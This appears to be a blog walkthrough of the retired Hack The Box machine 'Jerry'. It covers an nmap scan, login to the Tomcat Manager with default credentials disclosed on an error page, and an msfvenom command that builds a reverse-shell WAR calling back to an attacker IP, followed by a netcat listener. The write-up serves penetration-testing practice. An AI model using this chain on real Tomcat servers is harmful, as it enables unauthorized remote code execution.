---
layout: post
title: "Jerry"
categories: HTB-Walkthrough
---

![jerry](/assets/img/jerry/jerry1.png)


Jerry is another OSCP-like box from the HTB 'retired' archive. It's one of the most straight
forward boxes on the list.



<h3>Nmap</h3>

`nmap -sV -Pn --min-rate 10000 10.10.10.95 |tee -a jerry.txt`

```

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

```

Not much appears to be going on! We have a Tomcat server on port 8080; these are usually straight
forward to pwn.

`Apache Tomcat/7.0.88`

Clicking on the `Manager App` button we get a login popup, admin/admin fails, and we are directed
to an error page.

![tomcat-error](/assets/img/jerry/jerry-tomcat-error.png)

It discloses the example creds of tomcat/s3cret.

Trying these creds is successful and we are taken to a manager's dashboard.

<hr width="250" size="6">


We need to upload an evil WAR file containing a reverse shell to gain access to the target.

The first step is to generate one with msfvenom.


<h3>msfvenom</h3>

```

msfvenom -p java/jsp_shell_reverse_tcp -f war lhost=10.10.14.14 lport=443 -o evil.war

```

<hr width="250" size="6">

<h3>Exploit</h3>

Time to upload the war file.

![upload war](/assets/img/jerry/jerry-upload-war.png)

Once uploaded its time to execute the exploit. Make sure a netcat listener is set to 443
`nc -nlvp 443'

To pull the trigger, simply click on /evil in the list.

![execute](/assets/img/jerry/jerry-execute.png)


we get our shell...

![revshell](/assets/img/jerry/jerry-revshell.png)


Its already a shell with System/Administrator privileges, so it's no effort to pick up the flags.

:)


